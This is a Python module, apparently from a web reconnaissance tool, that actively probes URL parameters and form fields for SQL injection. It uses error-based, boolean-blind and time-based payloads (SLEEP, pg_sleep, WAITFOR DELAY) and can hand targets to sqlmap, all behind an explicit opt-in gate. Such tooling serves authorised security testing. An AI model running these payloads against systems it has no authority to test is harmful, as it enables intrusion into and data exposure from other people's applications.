"""Active SQL injection tester — the gated attack tier (C5).

This module ACTIVELY sends payloads to discovered form endpoints and URL
parameters to prove SQL injection. That's a step past recce's usual
passive stance, so every entry point checks a hard gate first — the
tester must have explicitly opted in via `RECCE_ACTIVE_ATTACKS=1` in
the environment OR by passing `active_attacks=True` to the API entry
points.

Detection strategies (in order of decreasing subtlety):

  1. **Error-based** — inject a single quote; match the response for
     canonical DB error strings (MySQL/PostgreSQL/MSSQL/SQLite/Oracle).
     Fastest signal; also the most likely to leak schema in the finding.
  2. **Boolean-blind** — inject `AND 1=1` and `AND 1=2` variants; a
     material difference in response length or status = confirmed
     boolean-blind SQLi.
  3. **Time-based** — inject a SLEEP/pg_sleep/WAITFOR; time the response.
     Slowest tier, used only when error+boolean are inconclusive.

Optional sqlmap orchestration hands the payload discovery off to sqlmap
against confirmed injection points — much deeper than what a compact
native tester can do, but requires sqlmap installed on the box.

Airgap-safe: stdlib http.client + ssl + subprocess (for sqlmap). No
external network calls beyond the target being tested.
"""
from __future__ import annotations

import http.client
import os
import re
import ssl
import subprocess
import time
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse


_UA = "recce-sqli/1.0"
_REQ_TIMEOUT = 8.0
_TIME_PAYLOAD_S = 3                       # SLEEP(3) — must be big enough to
                                           # beat network jitter, small enough
                                           # not to look like a DoS attempt
_TIME_MARGIN_S = 2.0                       # baseline + margin must be < timed


# ---- Gate -------------------------------------------------------------------

class ActiveAttacksDisabled(RuntimeError):
    """Raised when a SQLi entry point is called without the gate satisfied.
    Callers should catch this and surface it to the tester as
    'set RECCE_ACTIVE_ATTACKS=1 to opt in'."""


def _gate(active_attacks: bool | None) -> None:
    """Enforce the opt-in. Accepts either an explicit boolean or falls back
    to the env-var. Raises ActiveAttacksDisabled on refusal."""
    if active_attacks is True:
        return
    if active_attacks is False:
        raise ActiveAttacksDisabled(
            "active SQLi disabled by explicit active_attacks=False")
    if os.environ.get("RECCE_ACTIVE_ATTACKS", "").lower() in ("1", "true", "yes"):
        return
    raise ActiveAttacksDisabled(
        "active SQLi requires opt-in — set RECCE_ACTIVE_ATTACKS=1 "
        "in the environment or pass active_attacks=True to acknowledge that "
        "recce will send injection payloads to the target.")


# ---- DB error signatures ----------------------------------------------------

_ERROR_PATTERNS: list[tuple[str, re.Pattern]] = [
    ("mysql",      re.compile(r"You have an error in your SQL syntax|"
                              r"mysql_(fetch|num_rows|query)|"
                              r"MySQL server version for the right syntax", re.I)),
    ("postgres",   re.compile(r"PostgreSQL.*(ERROR|WARNING)|pg_query|"
                              r"unterminated quoted string|"
                              r"syntax error at or near", re.I)),
    ("mssql",      re.compile(r"Microsoft SQL Server|"
                              r"Unclosed quotation mark after the character string|"
                              r"System\.Data\.SqlClient\.SqlException|"
                              r"\[Microsoft\]\[ODBC SQL Server", re.I)),
    ("oracle",     re.compile(r"ORA-\d{5}|Oracle.*(error|driver)", re.I)),
    ("sqlite",     re.compile(r"SQLite/JDBCDriver|SQLite\.Exception|"
                              r"System\.Data\.SQLite\.SQLiteException|"
                              r"near \".+\": syntax error", re.I)),
    ("generic_odbc", re.compile(r"\[ODBC .+ Driver\]|"
                                r"SQLSTATE\[HY000\]|"
                                r"unclosed quotation mark", re.I)),
]


def _detect_db_error(body: str) -> tuple[str, str] | None:
    """Return (db-name, matched-text[:200]) if the body contains a SQL error
    signature, None otherwise."""
    for name, pat in _ERROR_PATTERNS:
        m = pat.search(body)
        if m:
            return (name, m.group(0)[:200])
    return None


# ---- HTTP helpers -----------------------------------------------------------

def _request(method: str, url: str, params: dict | None = None,
             data: dict | None = None, timeout: float = _REQ_TIMEOUT):
    """One HTTP request. Returns (status, body, elapsed_seconds) or None on
    transport-level failure. Does NOT follow redirects — a SQLi test wants to
    see the raw response, not the login page it might redirect to."""
    parsed = urlparse(url)
    host, port_ = parsed.hostname, parsed.port
    scheme = parsed.scheme or "http"
    if port_ is None:
        port_ = 443 if scheme == "https" else 80
    path = parsed.path or "/"
    if params:
        q = urlencode(params, doseq=True)
        path = f"{path}?{q}" if "?" not in path else f"{path}&{q}"
    body_bytes = urlencode(data).encode() if data else None
    headers = {"User-Agent": _UA, "Connection": "close", "Accept": "*/*"}
    if body_bytes is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Content-Length"] = str(len(body_bytes))
    conn = None
    try:
        if scheme == "https":
            ctx = ssl._create_unverified_context()
            conn = http.client.HTTPSConnection(host, port_, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port_, timeout=timeout)
        start = time.monotonic()
        conn.request(method, path, body=body_bytes, headers=headers)
        resp = conn.getresponse()
        body = resp.read(500_000).decode("utf-8", "replace")
        elapsed = time.monotonic() - start
        return resp.status, body, elapsed
    except (OSError, http.client.HTTPException, ssl.SSLError, ValueError):
        return None
    finally:
        if conn is not None:
            try: conn.close()
            except OSError: pass


# ---- Detection strategies ---------------------------------------------------

def _test_error_based(url: str, method: str, params: dict, param_name: str,
                      original_value: str, is_form: bool) -> dict | None:
    """Inject a single quote and look for a DB error signature."""
    payload = original_value + "'"
    injected = dict(params); injected[param_name] = payload
    r = _request(method, url,
                 params=None if is_form else injected,
                 data=injected if is_form else None)
    if r is None:
        return None
    _status, body, _t = r
    err = _detect_db_error(body)
    if err:
        return {"technique": "error-based", "db": err[0],
                "evidence": err[1], "payload": payload}
    return None


def _test_boolean_blind(url: str, method: str, params: dict, param_name: str,
                        original_value: str, is_form: bool) -> dict | None:
    """Send two payloads (AND 1=1 and AND 1=2). A material size delta implies
    boolean-based blind SQLi. Uses length delta >= 32 bytes as the threshold
    to reject small dynamic-content noise."""
    truthy = f"{original_value}' AND '1'='1"
    falsy = f"{original_value}' AND '1'='2"
    tp = dict(params); tp[param_name] = truthy
    fp = dict(params); fp[param_name] = falsy
    rt = _request(method, url,
                  params=None if is_form else tp,
                  data=tp if is_form else None)
    rf = _request(method, url,
                  params=None if is_form else fp,
                  data=fp if is_form else None)
    if rt is None or rf is None:
        return None
    _st, bt, _ = rt
    _sf, bf, _ = rf
    if abs(len(bt) - len(bf)) >= 32:
        return {"technique": "boolean-blind",
                "evidence": (f"len(true-payload)={len(bt)}  "
                             f"len(false-payload)={len(bf)}  "
                             f"delta={abs(len(bt)-len(bf))}"),
                "payload_true": truthy, "payload_false": falsy}
    return None


def _test_time_based(url: str, method: str, params: dict, param_name: str,
                     original_value: str, is_form: bool) -> dict | None:
    """Baseline round-trip time; then payload with SLEEP(N). Round-trip should
    now be > baseline + N - margin. Tries MySQL/Postgres/MSSQL syntax."""
    baseline_p = dict(params); baseline_p[param_name] = original_value
    r0 = _request(method, url,
                  params=None if is_form else baseline_p,
                  data=baseline_p if is_form else None,
                  timeout=max(_REQ_TIMEOUT, _TIME_PAYLOAD_S + 3))
    if r0 is None:
        return None
    baseline = r0[2]
    # Try each SLEEP flavor; stop at the first that pushes elapsed past threshold.
    for db, payload in (
            ("mysql",    f"{original_value}' AND SLEEP({_TIME_PAYLOAD_S})-- -"),
            ("postgres", f"{original_value}'; SELECT pg_sleep({_TIME_PAYLOAD_S})-- -"),
            ("mssql",    f"{original_value}'; WAITFOR DELAY '0:0:{_TIME_PAYLOAD_S}'-- -")):
        inj = dict(params); inj[param_name] = payload
        r = _request(method, url,
                     params=None if is_form else inj,
                     data=inj if is_form else None,
                     timeout=max(_REQ_TIMEOUT, _TIME_PAYLOAD_S + 5))
        if r is None:
            continue
        elapsed = r[2]
        if elapsed >= baseline + _TIME_PAYLOAD_S - _TIME_MARGIN_S:
            return {"technique": "time-based", "db": db,
                    "evidence": (f"baseline={baseline:.2f}s  "
                                 f"injected={elapsed:.2f}s  "
                                 f"delta={elapsed-baseline:.2f}s "
                                 f"(expected ~{_TIME_PAYLOAD_S}s)"),
                    "payload": payload}
    return None


# ---- Entry points -----------------------------------------------------------

def test_url_param(url: str, active_attacks: bool | None = None) -> list[dict]:
    """Test every URL query parameter in `url` for SQLi. Returns list of
    confirmed injection points {param, technique, ...}. Empty if no
    injection found; raises ActiveAttacksDisabled if the gate is off."""
    _gate(active_attacks)
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        return []
    # Reconstruct the base URL without query so _request builds it cleanly.
    base = urlunparse(parsed._replace(query=""))
    # Flatten multi-value params to first value (tester can retest specific ones).
    params = {k: (v[0] if v else "") for k, v in qs.items()}
    hits: list[dict] = []
    for name in list(params.keys()):
        original = params[name]
        for strat in (_test_error_based, _test_boolean_blind, _test_time_based):
            hit = strat(base, "GET", params, name, original, is_form=False)
            if hit:
                hit["param"] = name
                hit["url"] = url
                hits.append(hit)
                break                    # first-hit per param
    return hits


def test_form(url: str, method: str, inputs: list[str],
              active_attacks: bool | None = None,
              defaults: dict | None = None) -> list[dict]:
    """Test every input in a discovered form for SQLi. `inputs` is the list
    of input-name strings (from C2's discover_forms). `defaults` supplies
    baseline values (e.g. csrf tokens the tester should preserve)."""
    _gate(active_attacks)
    method = (method or "POST").upper()
    is_form = method != "GET"
    body = dict(defaults or {})
    # Populate defaults for inputs we don't know values for.
    for name in inputs:
        body.setdefault(name, "test")
    hits: list[dict] = []
    for name in inputs:
        if name.lower() in ("submit", "button"):    # skip pure submit buttons
            continue
        original = body[name]
        for strat in (_test_error_based, _test_boolean_blind, _test_time_based):
            hit = strat(url, method, body, name, original, is_form=is_form)
            if hit:
                hit["param"] = name
                hit["url"] = url
                hits.append(hit)
                break
    return hits


def sqlmap_available() -> bool:
    """Check whether sqlmap is on PATH — needed for the sqlmap orchestration
    entry point below."""
    try:
        r = subprocess.run(["sqlmap", "--version"], capture_output=True, timeout=5)
        return r.returncode == 0
    except (OSError, subprocess.SubprocessError):
        return False


def run_sqlmap(url: str, method: str = "GET", data: str | None = None,
               active_attacks: bool | None = None,
               risk: int = 1, level: int = 1,
               timeout_s: int = 300) -> dict:
    """Hand a target off to sqlmap for deeper testing. Returns
    {ok, output, cmd, injected_params:[]}. Requires sqlmap installed;
    caller can check sqlmap_available() first."""
    _gate(active_attacks)
    if not sqlmap_available():
        return {"ok": False, "output": "sqlmap not on PATH", "cmd": "", "injected_params": []}
    cmd = ["sqlmap", "-u", url, "--batch",
           f"--risk={risk}", f"--level={level}",
           "--random-agent", "--threads=4"]
    if data:
        cmd += ["--data", data]
    if method.upper() != "GET":
        cmd += ["--method", method.upper()]
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=timeout_s)
    except subprocess.TimeoutExpired:
        return {"ok": False, "output": f"sqlmap timeout after {timeout_s}s",
                "cmd": " ".join(cmd), "injected_params": []}
    out = r.stdout.decode("utf-8", "replace")
    # sqlmap reports each injected parameter with a line like:
    # "Parameter: id (GET)"  followed by "Type: boolean-based blind"
    injected = re.findall(r"Parameter:\s+(\S+)\s+\(([A-Z]+)\)", out)
    return {"ok": r.returncode == 0 and bool(injected),
            "output": out[-8000:],                # keep last 8 KB for the report
            "cmd": " ".join(cmd),
            "injected_params": [{"param": p, "method": m} for p, m in injected]}
